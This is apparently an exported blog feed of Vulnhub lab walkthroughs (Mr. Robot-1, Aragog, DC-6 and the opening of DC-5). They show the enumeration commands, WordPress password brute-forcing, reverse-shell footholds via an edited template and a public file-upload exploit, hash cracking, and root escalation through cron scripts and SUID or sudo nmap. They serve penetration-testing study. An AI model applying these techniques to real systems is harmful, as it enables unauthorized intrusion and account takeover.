+/IMAGE                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.197.146/IMAGE/]
+/rss2                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.197.146/feed/]
+/readme               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7334]
+/rdf                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.197.146/feed/rdf/]
+/0000                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.197.146/0000/]
+/wp-config            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0]
+</code></pre></div></div>
+
+<p>Upon checking the Gobuster output, we discovered some interesting URLs. The most intriguing aspect is that the application is built on WordPress. Additionally, from the robots.txt file, we found two more filenames: one is <code class="language-plaintext highlighter-rouge">first_key</code>, and the other is a <code class="language-plaintext highlighter-rouge">wordlist</code>.</p>
+
+<p><img src="/assets/images/mr-robot-1/2.png" alt="" /></p>
+
+<p>WordPress responds differently during login attempts depending on whether the username and password are correct or incorrect. To ensure accuracy, I ran Hydra using the file obtained from the application as a list of usernames and a simple password. After a short while, I received a valid username response. Now that I have a valid username, I can use Hydra again, this time with the username and the file as a password list to retrieve the password.</p>
+
+<p><img src="/assets/images/mr-robot-1/3.png" alt="" /></p>
+
+<p>I utilized WPScan to discover the password for the username I found using Hydra, and I successfully retrieved the password. While WPScan can comprehensively explore WordPress installations, including usernames, passwords, and other vulnerabilities, I chose to skip that part since I already obtained the necessary information through Hydra.</p>
+
+<p><img src="/assets/images/mr-robot-1/4.png" alt="" /></p>
+
+<p>I successfully logged into an administrative account. Given its administrative privileges, there are several methods to obtain a reverse shell. One option involves uploading a reverse shell plugin to acquire a reverse shell from there. Alternatively, we can edit an existing file to incorporate the reverse shell code and obtain a reverse shell from it.</p>
+
+<p><img src="/assets/images/mr-robot-1/5.png" alt="" /></p>
+
+<h1 id="initial-foothold">Initial Foothold</h1>
+
+<p>For now, I will edit the 404 page because it’s easy to generate a 404 response. I’ve copied a reverse shell, updated the IP and port, and then saved the file.</p>
+
+<p><img src="/assets/images/mr-robot-1/6.png" alt="" /></p>
+
+<p>Here, I’ve fired up a netcat listener to catch the reverse shell. From the browser, I generated a 404 response, and I successfully received the reverse shell from the machine.</p>
+
+<p><img src="/assets/images/mr-robot-1/7.png" alt="" /></p>
+
+<h1 id="post-enumeration--privilege-escalation">Post Enumeration &amp; Privilege Escalation</h1>
+
+<p>I upgraded my shell using stty. From the robot user’s home directory, I obtained their username and password. The password was encrypted with MD5, as indicated in the filename. After cracking the hash, I changed the user to <code class="language-plaintext highlighter-rouge">robot</code>.</p>
+
+<p><img src="/assets/images/mr-robot-1/8.png" alt="" /></p>
+
+<p>Crackstation crack the password very easily.</p>
+
+<p><img src="/assets/images/mr-robot-1/8.png" alt="" /></p>
+
+<p>Now, I’ve searched for the SUID binaries and found nmap among them. The old version of nmap features an interactive mode through which we can potentially obtain a shell. Since nmap is listed as an SUID binary, there’s a possibility of escalating privileges to root from here.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+</code></pre></div></div>
+
+<p>I ran nmap in interactive mode and successfully received the shell with root privileges.</p>
+
+<p><img src="/assets/images/mr-robot-1/10.png" alt="" /></p>]]></content><author><name>raju</name></author><category term="TJ-Null-OSCP" /><summary type="html"><![CDATA[Mr. Robot-1]]></summary></entry><entry><title type="html">Vulnhub Aragog Walkthrough</title><link href="http://localhost:4000/harry-potter-series/vulnhub-aragog-walkthrough/" rel="alternate" type="text/html" title="Vulnhub Aragog Walkthrough" /><published>2023-11-10T00:00:00+05:30</published><updated>2023-11-10T00:00:00+05:30</updated><id>http://localhost:4000/harry-potter-series/vulnhub-aragog-walkthrough</id><content type="html" xml:base="http://localhost:4000/harry-potter-series/vulnhub-aragog-walkthrough/"><![CDATA[<p>This box is pretty straightforward; nothing complex here. Enumeration is the key. We need to enumerate and use the gathered information at the perfect moment. From the Nmap scan, we found the SSH and HTTP ports open. By visiting the web server, we discovered it’s a WordPress application, and there is a vulnerable plugin, wp-file-manager, which is susceptible to an Unauthenticated Arbitrary File Upload vulnerability. This vulnerability gives us the initial foothold.</p>
+
+<p>For privilege escalation, the author of this box did not install WordPress in the usual place. We need to find out the configuration file, and from there, we can get the MySQL credentials. Logging into MySQL provides us with the hagrid98 user password hash. Using John, we decrypt the password and log in as the hagrid98 user. Then, we find the cronjob and modify the file to gain root access.</p>
+
+<h1 id="information-gathering">Information Gathering</h1>
+
+<p>First, I want to begin with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ports</span><span class="o">=</span><span class="si">$(</span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-T4</span> <span class="nv">$IP</span> | <span class="nb">grep</span> ^[0-9] | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'/'</span> <span class="nt">-f</span> 1 | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed </span>s/,<span class="nv">$/</span>/<span class="si">)</span> <span class="p">;</span> nmap <span class="nt">-p</span><span class="nv">$ports</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> nmap/service_scan <span class="nv">$IP</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: Site doesn<span class="s1">'t have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></code></pre></div></div>
+
+<p>From the Nmap scan, we found two publicly available ports: the first one being SSH, and the second one is HTTP. Both banners indicate it’s a Debian box. However, we did not gather much information from the Nmap results. Let’s manually check the application since we don’t have any credentials to work with SSH directly.</p>
+
+<p><strong>Manual Inspection</strong></p>
+
+<p><img src="/assets/images/aragog/1.png" alt="" /></p>
+
+<p>There is only a Harry Potter image available, and there’s no apparent user-server communication. At this point, we can begin fuzzing for directories and files.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-z</span> file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt <span class="nt">--hc</span> 404 <span class="s2">"</span><span class="nv">$URL</span><span class="s2">"</span>
+
+<span class="o">=====================================================================</span>
+ID           Response   Lines    Word       Chars       Payload                                                                                        
+<span class="o">=====================================================================</span>
+
+000000069:   200        5 L      11 W       97 Ch       <span class="s2">"index.html"</span>                                                                                   
+000000157:   403        9 L      28 W       275 Ch      <span class="s2">".htaccess"</span>                                                                                    
+000000379:   200        5 L      11 W       97 Ch       <span class="s2">"."</span>                                                                                            
+000000537:   403        9 L      28 W       275 Ch      <span class="s2">".html"</span>                                                                                        
+000000806:   403        9 L      28 W       275 Ch      <span class="s2">".php"</span>                                                                                         
+000001564:   403        9 L      28 W       275 Ch      <span class="s2">".htpasswd"</span>                                                                                    
+000001830:   403        9 L      28 W       275 Ch      <span class="s2">".htm"</span>                                                                                         
+000002100:   403        9 L      28 W       275 Ch      <span class="s2">".htpasswds"</span>                                                                                   
+000004625:   403        9 L      28 W       275 Ch      <span class="s2">".htgroup"</span>                                                                                     
+000005172:   403        9 L      28 W       275 Ch      <span class="s2">"wp-forum.phps"</span>                                                                                
+000007079:   403        9 L      28 W       275 Ch      <span class="s2">".htaccess.bak"</span>                                                                                
+000008688:   403        9 L      28 W       275 Ch      <span class="s2">".htuser"</span>                                                                                      
+000011459:   403        9 L      28 W       275 Ch      <span class="s2">".ht"</span>                                                                                          
+000011460:   403        9 L      28 W       275 Ch      <span class="s2">".htc"</span>                                                                                         
+000017181:   403        9 L      28 W       275 Ch      <span class="s2">".htaccess.old"</span>                                                                                
+000017182:   403        9 L      28 W       275 Ch      <span class="s2">".htacess"</span>
+</code></pre></div></div>
+
+<p>File fuzzing didn’t yield anything interesting. However, during directory fuzzing, I discovered a ‘blog’ directory with a status code of 301. Let’s visit the directory manually.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-z</span> file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt <span class="nt">--hc</span> 404 <span class="s2">"</span><span class="nv">$URL</span><span class="s2">"</span>
+
+<span class="o">=====================================================================</span>
+ID           Response   Lines    Word       Chars       Payload                                                                                        
+<span class="o">=====================================================================</span>
+000000050:   301        9 L      28 W       307 Ch      <span class="s2">"blog"</span>                                                                                         
+000000139:   301        9 L      28 W       313 Ch      <span class="s2">"javascript"</span>                                                                                   
+000004227:   403        9 L      28 W       275 Ch      <span class="s2">"server-status"</span>
+</code></pre></div></div>
+
+<p>The application did not load properly. When I hovered the mouse over a link, I found a domain name. Let’s add this to the hosts file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'10.10.10.7 wordpress.aragog.hogwarts'</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+
+10.10.10.7 wordpress.aragog.hogwarts
+</code></pre></div></div>
+
+<p>Now the application is loaded properly and this is a WordPress application.</p>
+
+<p><img src="/assets/images/aragog/2.png" alt="" /></p>
+
+<p>Always running some recon in the background is better. Since it’s a WordPress application, I would like to run WPScanner in the background to enumerate the themes and plugins used here.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--enumerate</span> ap <span class="nt">--plugins-detection</span> aggressive <span class="nt">--plugins-version-detection</span> aggressive <span class="nt">--url</span> http://wordpress.aragog.hogwarts/blog 
+
+<span class="o">[</span>+] URL: http://wordpress.aragog.hogwarts/blog/ <span class="o">[</span>10.10.10.7]
+<span class="o">[</span>+] Started: Tue Nov 14 20:14:07 2023
+
+Interesting Finding<span class="o">(</span>s<span class="o">)</span>:
+
+<span class="o">[</span>+] WordPress version 5.0.12 identified <span class="o">(</span>Insecure, released on 2021-04-15<span class="o">)</span><span class="nb">.</span>
+
+<span class="o">[</span>+] WordPress theme <span class="k">in </span>use: twentynineteen
+ | <span class="o">[!]</span> The version is out of <span class="nb">date</span>, the latest version is 2.7
+
+<span class="o">[</span>i] Plugin<span class="o">(</span>s<span class="o">)</span> Identified:
+
+<span class="o">[</span>+] akismet
+ | Location: http://wordpress.aragog.hogwarts/blog/wp-content/plugins/akismet/
+ | Latest Version: 5.3
+
+<span class="o">[</span>+] wp-file-manager
+ | Version: 6.0 <span class="o">(</span>100% confidence<span class="o">)</span>
+</code></pre></div></div>
+
+<p>WPScanner found the default themes and plugins, and it identified the presence of the wp-file-manager plugin. At this point, I would like to search for publicly available exploits. The Exploit Database has a cross-site scripting vulnerability exploit for the Akismet plugin and an unauthenticated arbitrary file upload leading to RCE exploit for wp-file-manager plugins.</p>
+
+<p><img src="/assets/images/aragog/3.png" alt="" /></p>
+
+<p>I copied the exploit into my current directory and ran it. Fortunately, it successfully exploited the vulnerability. It’s confirmed now that there is a file upload vulnerability leading to RCE. I attempted to take a reverse shell through RCE, but unfortunately, I failed.</p>
+
+<p><img src="/assets/images/aragog/4.png" alt="" /></p>
+
+<p>So, I planned to upload a reverse shell file. This payload helped me successfully upload the file to the server.</p>
+
+<p><img src="/assets/images/aragog/5.png" alt="" /></p>
+
+<h1 id="initial-foothold">Initial Foothold</h1>
+
+<p>I uploaded a PHP reverse shell payload file from PentesterMonkey.</p>
+
+<p><img src="/assets/images/aragog/6.png" alt="" /></p>
+
+<p>After successfully uploaded the file i just visited this URl with a listener on to catch the revers shell.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">http</span><span class="p">:</span><span class="c1">//wordpress.aragog.hogwarts//blog/wp-content/plugins/wp-file-manager/lib/files/exp.php</span>
+</code></pre></div></div>
+
+<p>It gave me the initial foothold into the box by providing a reverse shell.</p>
+
+<p><img src="/assets/images/aragog/7.png" alt="" /></p>
+
+<h1 id="post-enumeration--privilege-escalation">Post Enumeration &amp; Privilege Escalation</h1>
+
+<p>After obtaining the shell as www-data, I explored the file system and discovered the ‘.backup.sh’ file inside the ‘/opt’ directory. I only have execute and read permissions, and the owner of this file, ‘hagrid98,’ has full authority. Given the file name ‘backup’ and its function of copying files from the web server’s upload directory to the ‘tmp’ folder, there is a possibility of a cronjob. Since this is a WordPress installation, the config file may contain the MySQL credentials. Let’s find that.</p>
+
+<p><img src="/assets/images/aragog/8.png" alt="" /></p>
+
+<p>From the backup script, we observed that the WordPress folder is not present inside ‘/var/www/html.’ They configured this in a different way. I want to find all folders named ‘wordpress’ first and will check each one for critical information.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Aragog:/var/www<span class="nv">$ </span>find / <span class="nt">-type</span> d <span class="nt">-name</span> wordpress 2&gt; /dev/null
+/var/lib/wordpress
+/var/lib/mysql/wordpress
+/usr/share/doc/wordpress
+/usr/share/wordpress
+/usr/share/wordpress/wp-includes/js/tinymce/skins/wordpress
+/usr/share/wordpress/wp-includes/js/tinymce/plugins/wordpress
+/etc/wordpress
+</code></pre></div></div>
+
+<p>However, from the ‘find’ command output, the first directory that caught my eye was the ‘/etc/wordpress’ folder. Inside the directory, I found the ‘config-default.php’ file containing the credentials.</p>
+
+<p><img src="/assets/images/aragog/9.png" alt="" /></p>
+
+<p>Inside the database i found hagrid98 user and password hash.</p>
+
+<p><img src="/assets/images/aragog/10.png" alt="" /></p>
+
+<p>John was so kind to decrypt the hash within a moment.</p>
+
+<p><img src="/assets/images/aragog/11.png" alt="" /></p>
+
+<p>Now that I have the credentials, I tried to log in through SSH, and it succeeded. I now have a proper SSH connection into the box.</p>
+
+<p><img src="/assets/images/aragog/12.png" alt="" /></p>
+
+<p>As the previous confusion about the cronjob persisted, I transferred pspy64 into the box and ran it to observe all the input and output activities inside the machine. Within a few moments, I got a hit from root to the ‘<a href="http://backup.sh/">backup.sh</a>’ file. Now, as the hagrid98 user, I have the ability to modify the file—I can put anything I want, and root will execute whatever I write into that file. Getting root is now just a piece of cake.</p>
+
+<p><img src="/assets/images/aragog/13.png" alt="" /></p>
+
+<p>I modified the file and added a reverse shell script. When the root user executes the file, I will get a reverse shell as root.</p>
+
+<p><img src="/assets/images/aragog/14.png" alt="" /></p>
+
+<p>I opened the listener and waited for root to execute the file. Within a minute, I got the shell, and I am now root.</p>
+
+<p><img src="/assets/images/aragog/15.png" alt="" /></p>]]></content><author><name>raju</name></author><category term="Harry-Potter-Series" /><summary type="html"><![CDATA[This box is pretty straightforward; nothing complex here. Enumeration is the key. We need to enumerate and use the gathered information at the perfect moment. From the Nmap scan, we found the SSH and HTTP ports open. By visiting the web server, we discovered it’s a WordPress application, and there is a vulnerable plugin, wp-file-manager, which is susceptible to an Unauthenticated Arbitrary File Upload vulnerability. This vulnerability gives us the initial foothold.]]></summary></entry><entry><title type="html">Vulnhub DC-6 Walkthrough</title><link href="http://localhost:4000/dc-series/vulnhub-dc-6-walkthroug/" rel="alternate" type="text/html" title="Vulnhub DC-6 Walkthrough" /><published>2023-10-23T00:00:00+05:30</published><updated>2023-10-23T00:00:00+05:30</updated><id>http://localhost:4000/dc-series/vulnhub-dc-6-walkthroug</id><content type="html" xml:base="http://localhost:4000/dc-series/vulnhub-dc-6-walkthroug/"><![CDATA[<p>For the initial foothold, we initiated a password brute-force attack based on a custom-generated password list, following a clue provided by the box’s author. After obtaining the password, we were able to log in to the web application and discovered the activity monitor. A search on Exploit-DB revealed a publicly available exploit that facilitated the initial foothold. While exploring the file system, we discovered a user credential with read, write, and execute permissions, along with the ability to run the file as a different user. Exploiting these permissions granted another user privilege. The new user gained the ability to run ‘nmap’ as root. Leveraging this, we created a simple script and executed it through ‘nmap’ as a superuser, ultimately achieving root access to the box.</p>
+
+<h1 id="information-gathering">Information Gathering</h1>
+<p>First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ports</span><span class="o">=</span><span class="si">$(</span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-T4</span> <span class="nv">$IP</span> | <span class="nb">grep</span> ^[0-9] | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'/'</span> <span class="nt">-f</span> 1 | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed </span>s/,<span class="nv">$/</span>/<span class="si">)</span> <span class="p">;</span> nmap <span class="nt">-p</span><span class="nv">$ports</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> nmap/service_scan <span class="nv">$IP</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd <span class="o">(</span>RSA<span class="o">)</span>
+|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-title: Did not follow redirect to http://wordy/
+|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>From the Nmap results, I found that this is a Debian-based Linux system with SSH and an Apache server installed. Apache is redirected to a domain called <code class="language-plaintext highlighter-rouge">wordy</code>. To visit the domain, you need to add an entry in the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>
+
+<p>Manual Inspection</p>
+
+<p><img src="/assets/images/dc-6/1.png" alt="" /></p>
+
+<p>Upon manual inspection of the site, I discovered it’s a WordPress web application. It would be a good idea to run a WordPress scanner to thoroughly scan the application.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--enumerate</span> <span class="nt">--url</span> <span class="nv">$URL</span>
+
+<span class="o">[</span>+] URL: http://wordy/ <span class="o">[</span>192.168.197.137]
+<span class="o">[</span>+] Started: Fri Oct 20 00:28:15 2023
+
+Interesting Finding<span class="o">(</span>s<span class="o">)</span>:
+<span class="o">[</span>+] WordPress version 5.1.1 identified <span class="o">(</span>Insecure, released on 2019-03-13<span class="o">)</span><span class="nb">.</span>
+<span class="o">[</span>+] WordPress theme <span class="k">in </span>use: twentyseventeen
+
+<span class="o">[</span>i] User<span class="o">(</span>s<span class="o">)</span> Identified:
+<span class="o">[</span>+] admin
+<span class="o">[</span>+] mark
+<span class="o">[</span>+] graham
+<span class="o">[</span>+] sarah
+<span class="o">[</span>+] jens
+</code></pre></div></div>
+
+<p>From the WPScanner output, I found the WordPress version, an outdated theme, but nothing significantly critical. Some users were revealed, but no passwords were disclosed. Now, let’s generate a password list with Cewl to conduct a password-based scan.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cewl <span class="nt">-d</span> 3 <span class="nt">-w</span> password.txt <span class="nv">$URL</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/dc-6/2.png" alt="" /></p>
+
+<p>I generated a password and ran the password-based scan.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> <span class="nv">$URL</span> <span class="nt">--passwords</span> password.txt
+
+<span class="o">[</span>+] Performing password attack on Xmlrpc against 5 user/s
+Trying graham / here Time: 00:00:07 &lt;<span class="o">=======&gt;</span> <span class="o">(</span>445 / 445<span class="o">)</span> 100.00% Time: 00:00:07
+
+<span class="o">[</span>i] No Valid Passwords Found.
+</code></pre></div></div>
+
+<p>I couldn’t find any passwords. After spending a considerable amount of time, I sought some help and discovered a clue from the author on the download page, which I had missed earlier. This experience serves as a valuable lesson in the importance of thorough reconnaissance.</p>
+
+<p><img src="/assets/images/dc-6/3.png" alt="" /></p>
+
+<p>Following the clue, I generated a new password list.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /usr/share/wordlists/rockyou.txt| <span class="nb">grep </span>k01 <span class="o">&gt;</span> password.txt
+</code></pre></div></div>
+
+<p><img src="/assets/images/dc-6/4.png" alt="" /></p>
+
+<p>Run the password scan again.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> <span class="nv">$URL</span> <span class="nt">--passwords</span> password.txt
+
+<span class="o">[</span>+] Performing password attack on Xmlrpc against 5 user/s
+<span class="o">[</span>SUCCESS] - mark / helpdesk01                                                                                                                                               
+Trying sarah / <span class="o">!</span>lak019b Time: 00:03:55 &lt;<span class="o">===&gt;</span> <span class="o">(</span>15215 / 15215<span class="o">)</span> 100.00% Time: 00:03:55
+
+<span class="o">[</span>i] Valid Combinations Found:
+ | Username: mark, Password: helpdesk01
+</code></pre></div></div>
+
+<p>This time, I found one valid user credential. After logging into the portal, I discovered that this user is not an admin, so it’s not possible to manage a reverse shell using this dashboard. However, there is an activity monitor. Let’s try searching with this.</p>
+
+<p><img src="/assets/images/dc-6/5.png" alt="" /></p>
+
+<p>There are two exploit available, i want to use the python exploit.</p>
+
+<p><img src="/assets/images/dc-6/6.png" alt="" /></p>
+
+<p>Download the exploit to my local directory.</p>
+
+<p><img src="/assets/images/dc-6/7.png" alt="" /></p>
+
+<h1 id="initial-foothold">Initial Foothold</h1>
+
+<p>After running the exploit, it prompted for the IP, username, and password, and then provided the shell. Now, I’m in.</p>
+
+<p><img src="/assets/images/dc-6/8.png" alt="" /></p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+
+<p>After obtaining the shell as www-data, I discovered that I have access to the /home directories. Inside the ‘mark’ directory, I found a file named ‘things_to_do’ containing the username ‘graham’ and password.</p>
+
+<p><img src="/assets/images/dc-6/9.png" alt="" /></p>
+
+<p>As there is an SSH server, I logged into the box as ‘graham’ and found that ‘graham’ can run ‘/home/jens/backup.sh’ as ‘jens’ without a password.</p>
+
+<p><img src="/assets/images/dc-6/10.png" alt="" /></p>
+
+<p>I discovered that graham also has the ability to write the file. By abusing the file permission it’s possible to get jens users privilege.</p>
+
+<p><img src="/assets/images/dc-6/11.png" alt="" /></p>
+
+<p>From the ‘jens’ user, I found that ‘jens’ can run ‘nmap’ with sudo privileges without entering a password. This is a very dangerous privilege that can be abused by anyone.</p>
+
+<p><img src="/assets/images/dc-6/12.png" alt="" /></p>
+
+<p>There are two types of techniques to escalate privileges with sudo access: through interactive mode and through script execution. However, the interactive mode is available only on versions 2.02 to 5.21. So, let’s check the version.</p>
+
+<p><img src="/assets/images/dc-6/13.png" alt="" /></p>
+
+<p>In the updated version, the interactive mode is no longer supported, so we need to explore the other option: executing a script. Here, I created a script that will execute the ‘/bin/bash’ command, stored it in the tmp directory as ‘root.nse’, and executed the script, granting me root access.</p>
+
+<p><img src="/assets/images/dc-6/14.png" alt="" /></p>]]></content><author><name>raju</name></author><category term="DC-Series" /><summary type="html"><![CDATA[For the initial foothold, we initiated a password brute-force attack based on a custom-generated password list, following a clue provided by the box’s author. After obtaining the password, we were able to log in to the web application and discovered the activity monitor. A search on Exploit-DB revealed a publicly available exploit that facilitated the initial foothold. While exploring the file system, we discovered a user credential with read, write, and execute permissions, along with the ability to run the file as a different user. Exploiting these permissions granted another user privilege. The new user gained the ability to run ‘nmap’ as root. Leveraging this, we created a simple script and executed it through ‘nmap’ as a superuser, ultimately achieving root access to the box.]]></summary></entry><entry><title type="html">Vulnhub DC-5 Walkthrough</title><link href="http://localhost:4000/dc-series/vulnhub-dc-5-walkthrough/" rel="alternate" type="text/html" title="Vulnhub DC-5 Walkthrough" /><published>2023-10-22T00:00:00+05:30</published><updated>2023-10-22T00:00:00+05:30</updated><id>http://localhost:4000/dc-series/vulnhub-dc-5-walkthrough</id><content type="html" xml:base="http://localhost:4000/dc-series/vulnhub-dc-5-walkthrough/"><![CDATA[<p>This box proved to be quite engaging for me. The initial foothold presented an interesting challenge. Understanding the application’s workflow and identifying a hidden parameter vulnerable to LFI with code execution capabilities was crucial. Since file uploads were not possible, I opted for a log poisoning attack to achieve command injection. This sequence, starting with log poisoning and leading to command injection, allowed for the initial foothold. The privilege escalation was straightforward, involving the exploitation of a SUID binary for which a publicly available exploit already exists.</p>
+
+<h1 id="information-gathering">Information Gathering</h1>
+
+<p>First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ports</span><span class="o">=</span><span class="si">$(</span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-T4</span> <span class="nv">$IP</span> | <span class="nb">grep</span> ^[0-9] | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'/'</span> <span class="nt">-f</span> 1 | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed </span>s/,<span class="nv">$/</span>/<span class="si">)</span> <span class="p">;</span> nmap <span class="nt">-p</span><span class="nv">$ports</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> nmap/service_scan <span class="nv">$IP</span>
+
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    nginx 1.6.2
+|_http-server-header: nginx/1.6.2
+|<span class="k">*</span>http-title: Welcome
+111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          33051/tcp   status
+|   100024  1          42452/tcp6  status
+|   100024  1          45427/udp   status
+|<span class="k">*</span>   100024  1          47008/udp6  status
+33051/tcp open  status  1 <span class="o">(</span>RPC <span class="c">#100024)</span>
+</code></pre></div></div>
+
+<p>From the Nmap results, we identified three open ports. However, the only port of interest is port 80, where the Nginx server is listening. Let’s delve into the web application.</p>
+
+<p><strong>Manual Inspection</strong></p>
+
+<p><img src="/assets/images/dc-5/1.png" alt="" /></p>
+
+<p>The default homepage has a navbar, but aside from the ‘Contact’ tab, nothing is interesting to me at the moment. Before we dive deeper into the application, I would like to run a wfuzz fuzzing to discover hidden files.</p>
+
+<p><strong>Fuzzing</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-z</span> file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt <span class="nt">--hc</span> 404 <span class="s2">"</span><span class="nv">$URL</span><span class="s2">”
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                    
+=====================================================================
+000000001:   200        53 L     525 W      4024 Ch     "</span>index.php<span class="s2">"
+000000043:   200        57 L     752 W      5644 Ch     "</span>faq.php<span class="s2">"
+000000106:   200        71 L     479 W      4281 Ch     "</span>contact.php
+000000482:   200        42 L     66 W       851 Ch      <span class="s2">"thankyou.php"</span>
+000001951:   200        53 L     560 W      4291 Ch     <span class="s2">"about-us.php"</span>
+000016294:   200        51 L     525 W      4099 Ch     <span class="s2">"solutions.php"</span>
+</code></pre></div></div>
+
+<p>During the fuzzing process, the file that caught our interest is ‘thankyou.php.’ When we fill out all the information in the contact.php form and click the submit button, all the data will be processed inside the thankyou.php file through a GET request.</p>
+
+<p><img src="/assets/images/dc-5/2.png" alt="" /></p>
